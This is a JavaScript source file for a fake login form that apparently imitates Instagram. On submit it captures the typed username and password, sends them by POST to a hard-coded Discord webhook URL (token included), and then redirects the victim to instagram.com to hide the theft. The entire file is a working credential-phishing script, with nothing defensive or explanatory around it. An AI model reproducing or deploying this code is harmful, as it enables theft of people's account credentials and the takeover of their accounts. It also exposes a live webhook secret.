document.getElementById("loginForm").addEventListener("submit", function(event){
    event.preventDefault();

    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    

    if (username.trim === "" || password.trim === ""){
        alert("Username and password are required.");
        return;
    }

    var lodingElement = document.createElement("div");
    lodingElement.className = "loading"
    document.body.appendChild(lodingElement);

    var message = "Login Details:\n";
    message += "Username:" + username + "\n";
    message += "Password:" + password;
    
    sentToWebhook(message);
});

function sentToWebhook(message) {
    var webhookURL = "https://discord.com/api/webhooks/1228078295040393279/DlS-VTJrxKpGPD4lNF0OhM8l3w9ZEwnfi2Q6vGOsCW6nhJZyEDiLg4i31V9q1uU_KKqm"

    fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ content: message }),
    })
    .then(response => {
        if(!response.ok) {
            throw new Error('Failed to send message to Discord');
        }

        window.location.href = "https://www.instagram.com"
    })
    .catch(error => {
        console.error('Error sending message to Discord:', error);
        alert('Failed to login. Please try again later.');
    });
}